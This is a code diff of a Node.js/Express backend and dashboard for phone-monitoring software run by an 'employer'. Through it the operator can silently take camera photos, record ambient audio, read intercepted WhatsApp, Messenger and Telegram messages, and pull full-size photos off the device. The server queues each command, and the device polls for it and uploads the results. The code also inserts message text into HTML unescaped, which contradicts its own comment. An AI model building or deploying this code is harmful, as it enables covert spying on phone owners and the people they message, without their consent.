+                <div style="font-size:36px;margin-bottom:8px">🎙️</div>
+                <h4 style="color:#1a1a2e;margin-bottom:8px">Record Ambient</h4>
+                <p style="color:#888;font-size:12px;margin-bottom:12px">Record surroundings for 30 seconds</p>
+                <select id="record-duration" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
+                    <option value="15">15 seconds</option>
+                    <option value="30" selected>30 seconds</option>
+                    <option value="60">1 minute</option>
+                    <option value="120">2 minutes</option>
+                    <option value="300">5 minutes</option>
+                </select>
+                <button class="btn btn-primary" onclick="sendCommand('record_ambient')" style="width:100%">Start Recording</button>
             </div>
+            
+            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
+                <div style="font-size:36px;margin-bottom:8px">📷</div>
+                <h4 style="color:#1a1a2e;margin-bottom:8px">Take Photo</h4>
+                <p style="color:#888;font-size:12px;margin-bottom:12px">Silently capture front or back camera</p>
+                <select id="camera-facing" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
+                    <option value="back">Back Camera</option>
+                    <option value="front">Front Camera</option>
+                </select>
+                <button class="btn btn-primary" onclick="sendCommand('take_photo')" style="width:100%">Take Photo</button>
+            </div>
+        </div>
+
+        <div id="remote-msg" style="display:none;padding:10px;border-radius:8px;margin-bottom:16px"></div>
+
+        <h4 style="color:#1a1a2e;margin-bottom:12px">Recent Results</h4>
+        <div id="remote-results">
+            <p style="color:#888;text-align:center;padding:20px">Loading results...</p>
+        </div>
+    </div>
+</div>
+
+     <!-- Media Tab -->
+<div id="tab-media" class="tab-content">
+    <div class="card" style="padding:0">
+        ${media.length === 0 ? '<p class="no-data">No media files</p>' : `
+        <table>
+            <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
+          ${media.map(m => `<tr>
+    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" style="cursor:pointer" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : 'No preview'}</td>
+    <td>${m.filename}</td>
+    <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
+    <td>${Math.round(m.size_bytes / 1024)}KB</td>
+    <td>${new Date(m.date_taken).toLocaleString()}</td>
+    <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
+</tr>`).join('')}
+        </table>`}
+    </div>
+</div>
 
 <!-- Lightbox -->
 <div id="lightbox" onclick="closeLightbox()" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;justify-content:center;align-items:center;cursor:pointer">
@@ -987,80 +890,19 @@ app.get("/device", async (req, res) => {
             <button class="btn" onclick="showDirection('outgoing', this)" id="btn-outgoing" style="background:#eee;color:#333">📤 Outgoing</button>
         </div>
 
-                    <!-- Remote Control Tab -->
-            <div id="tab-remote" class="tab-content">
-                <div class="card">
-                    <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
-                    <p style="color:#888;font-size:13px;margin-bottom:20px">Commands are executed within 2 minutes when device is active.</p>
-                    
-                    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
-                        <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
-                            <div style="font-size:36px;margin-bottom:8px">🎙️</div>
-                            <h4 style="color:#1a1a2e;margin-bottom:8px">Record Ambient</h4>
-                            <p style="color:#888;font-size:12px;margin-bottom:12px">Record surroundings for 30 seconds</p>
-                            <select id="record-duration" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
-                                <option value="15">15 seconds</option>
-                                <option value="30" selected>30 seconds</option>
-                                <option value="60">1 minute</option>
-                                <option value="120">2 minutes</option>
-                                <option value="300">5 minutes</option>
-                            </select>
-                            <button class="btn btn-primary" onclick="sendCommand('record_ambient')" style="width:100%">Start Recording</button>
-                        </div>
-                        
-                        <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
-                            <div style="font-size:36px;margin-bottom:8px">📷</div>
-                            <h4 style="color:#1a1a2e;margin-bottom:8px">Take Photo</h4>
-                            <p style="color:#888;font-size:12px;margin-bottom:12px">Silently capture front or back camera</p>
-                            <select id="camera-facing" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
-                                <option value="back">Back Camera</option>
-                                <option value="front">Front Camera</option>
-                            </select>
-                            <button class="btn btn-primary" onclick="sendCommand('take_photo')" style="width:100%">Take Photo</button>
-                        </div>
-                    </div>
-
-                    <div id="remote-msg" style="display:none;padding:10px;border-radius:8px;margin-bottom:16px"></div>
-
-                    <h4 style="color:#1a1a2e;margin-bottom:12px">Recent Results</h4>
-                    <div id="remote-results">
-                        <p style="color:#888;text-align:center;padding:20px">Loading results...</p>
-                    </div>
-                </div>
-            </div>
-
         <!-- Incoming -->
         <div id="msg-incoming">
             <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px">
-                ${["Messenger", "WhatsApp", "Telegram"]
-                  .map(function (app) {
-                    const count = notifications.filter(function (n) {
-                      return n.app === app && n.direction !== "outgoing";
-                    }).length;
-                    const icon =
-                      app === "Messenger"
-                        ? "💬"
-                        : app === "WhatsApp"
-                          ? "📱"
-                          : "✈️";
-                    return (
-                      "<div onclick=\"showIncomingChats('" +
-                      app +
-                      '\')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" ' +
-                      "onmouseover=\"this.style.borderColor='#1a1a2e'\" onmouseout=\"this.style.borderColor='#eee'\">" +
-                      '<div style="font-size:28px;margin-bottom:8px">' +
-                      icon +
-                      "</div>" +
-                      '<div style="font-weight:bold;color:#1a1a2e">' +
-                      app +
-                      "</div>" +
-                      '<div style="color:#888;font-size:12px;margin-top:4px">' +
-                      count +
-                      " messages</div>" +
-                      "</div>"
-                    );
-                  })
-                  .join("")}
+                ${['Messenger','WhatsApp','Telegram'].map(function(app) {
+                    const count = notifications.filter(function(n) { return n.app === app && n.direction !== 'outgoing'; }).length;
+                    const icon = app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️';
+                    return '<div onclick="showIncomingChats(\'' + app + '\')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" '
+                        + 'onmouseover="this.style.borderColor=\'#1a1a2e\'" onmouseout="this.style.borderColor=\'#eee\'">'
+                        + '<div style="font-size:28px;margin-bottom:8px">' + icon + '</div>'
+                        + '<div style="font-weight:bold;color:#1a1a2e">' + app + '</div>'
+                        + '<div style="color:#888;font-size:12px;margin-top:4px">' + count + ' messages</div>'
+                        + '</div>';
+                }).join('')}
             </div>
             <div id="incoming-chats" style="display:none">
                 <button class="btn" onclick="document.getElementById('incoming-chats').style.display='none'" style="background:#eee;color:#333;margin-bottom:12px">← Back</button>
@@ -1077,32 +919,16 @@ app.get("/device", async (req, res) => {
         <div id="msg-outgoing" style="display:none">
             <table>
                 <tr><th>App</th><th>Sent To</th><th>Message</th><th>Date</th></tr>
-                ${notifications
-                  .filter(function (n) {
-                    return n.direction === "outgoing";
-                  })
-                  .map(function (n) {
-                    return (
-                      "<tr>" +
-                      "<td>" +
-                      n.app +
-                      "</td>" +
-                      "<td>" +
-                      (n.recipient || n.chat_id || "-") +
-                      "</td>" +
-                      "<td>" +
-                      n.message +
-                      "</td>" +
-                      "<td>" +
-                      new Date(n.received_at).toLocaleString() +
-                      "</td>" +
-                      "</tr>"
-                    );
-                  })
-                  .join("")}
+                ${notifications.filter(function(n) { return n.direction === 'outgoing'; }).map(function(n) {
+                    return '<tr>'
+                        + '<td>' + n.app + '</td>'
+                        + '<td>' + (n.recipient || n.chat_id || '-') + '</td>'
+                        + '<td>' + n.message + '</td>'
+                        + '<td>' + new Date(n.received_at).toLocaleString() + '</td>'
+                        + '</tr>';
+                }).join('')}
             </table>
         </div>
-
     </div>
 </div>
 
@@ -1125,6 +951,7 @@ app.get("/device", async (req, res) => {
         </div>
     </div>
 </div>
+
     </div>
     <script>
     if (!localStorage.getItem('employer_id')) window.location.href = '/';
@@ -1133,81 +960,123 @@ app.get("/device", async (req, res) => {
     </body></html>`);
 });
 
+
 // Employer requests full image download
-app.post("/employer/request-download", async (req, res) => {
-  try {
-    const { token, filename, image_id } = req.body;
-    const existing = await DownloadRequest.findOne({
-      token,
-      filename,
-      status: "pending",
-    });
-    if (existing)
-      return res.json({ success: true, message: "Already requested" });
-    await DownloadRequest.create({ token, filename, image_id });
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/employer/request-download', async (req, res) => {
+    try {
+        const { token, filename, image_id } = req.body;
+        const existing = await DownloadRequest.findOne({ token, filename, status: 'pending' });
+        if (existing) return res.json({ success: true, message: 'Already requested' });
+        await DownloadRequest.create({ token, filename, image_id });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 // Device polls for pending download requests
-app.get("/device/download-requests", async (req, res) => {
-  try {
-    const token = getToken(req);
-    const requests = await DownloadRequest.find({ token, status: "pending" });
-    res.json({ success: true, requests });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.get('/device/download-requests', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const requests = await DownloadRequest.find({ token, status: 'pending' });
+        res.json({ success: true, requests });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 // Device uploads full quality image
-app.post("/device/upload-full", async (req, res) => {
-  try {
-    const token = getToken(req);
-    const { filename, full_image } = req.body;
-    await DownloadRequest.findOneAndUpdate(
-      { token, filename },
-      { full_image, status: "uploaded" },
-    );
-    console.log(`Full image uploaded: ${filename} from ${token}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/device/upload-full', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const { filename, full_image } = req.body;
+        await DownloadRequest.findOneAndUpdate(
+            { token, filename },
+            { full_image, status: 'uploaded' }
+        );
+        console.log(`Full image uploaded: ${filename} from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 // Employer downloads full image then clears it
-app.post("/employer/download-full", async (req, res) => {
-  try {
-    const { token, filename } = req.body;
-    const request = await DownloadRequest.findOne({
-      token,
-      filename,
-      status: "uploaded",
-    });
-    if (!request)
-      return res.json({ success: false, message: "Image not ready yet" });
-    const image = request.full_image;
-    // Delete full image after download to save storage
-    await DownloadRequest.findOneAndUpdate(
-      { token, filename },
-      { full_image: null, status: "downloaded" },
-    );
-    res.json({ success: true, image });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/employer/download-full', async (req, res) => {
+    try {
+        const { token, filename } = req.body;
+        const request = await DownloadRequest.findOne({ token, filename, status: 'uploaded' });
+        if (!request) return res.json({ success: false, message: 'Image not ready yet' });
+        const image = request.full_image;
+        // Delete full image after download to save storage
+        await DownloadRequest.findOneAndUpdate(
+            { token, filename },
+            { full_image: null, status: 'downloaded' }
+        );
+        res.json({ success: true, image });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 // notification data is never injected directly into the HTML
-app.get("/device/notifications-data", async (req, res) => {
-  const token = req.query.token;
-  const notifications = await Notification.find({ token })
-    .sort({ received_at: -1 })
-    .limit(500);
-  res.json({ notifications });
+app.get('/device/notifications-data', async (req, res) => {
+    const token = req.query.token;
+    const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(500);
+    res.json({ notifications });
+});
+
+// Employer sends command
+app.post('/employer/command', async (req, res) => {
+    try {
+        const { token, type, duration } = req.body;
+        const command = await Command.create({ token, type, duration: duration || 30 });
+        res.json({ success: true, command_id: command._id });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Device polls for pending commands
+app.get('/device/commands', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const commands = await Command.find({ token, status: 'pending' });
+        // Mark as executing
+        for (const cmd of commands) {
+            await Command.findByIdAndUpdate(cmd._id, { status: 'executing' });
+        }
+        res.json({ success: true, commands });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Device sends result
+app.post('/device/command-result', async (req, res) => {
+    try {
+        const { command_id, result, status } = req.body;
+        await Command.findByIdAndUpdate(command_id, { 
+            result, 
+            status: status || 'done',
+            completed_at: new Date()
+        });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// Employer gets command results
+app.post('/employer/command-results', async (req, res) => {
+    try {
+        const { token } = req.body;
+        const commands = await Command.find({ token, status: 'done' })
+            .sort({ completed_at: -1 }).limit(20);
+        res.json({ success: true, commands });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
